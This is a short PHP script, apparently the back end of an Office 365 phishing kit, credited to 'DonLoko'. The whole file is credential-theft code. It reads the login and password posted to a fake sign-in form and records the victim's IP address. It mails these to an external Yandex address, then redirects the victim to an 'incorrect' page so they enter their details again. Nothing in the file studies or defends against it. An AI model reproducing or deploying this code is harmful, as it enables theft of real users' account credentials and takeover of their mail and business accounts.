<?
session_start();
$Email = $_GET['login'];
$_SESSION['login'];

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office 365-----------------------\n";
$message .= "Email: ".$_POST['login']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By DonLoko------------------------------\n";


$recipient = "plhr360@yandex.com";
$subject = "Office 365 RESULT $ip | ".$_POST['login']."\n";
$headers = "info@LOL.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "LOL", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header('Location: incorrect.php');
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
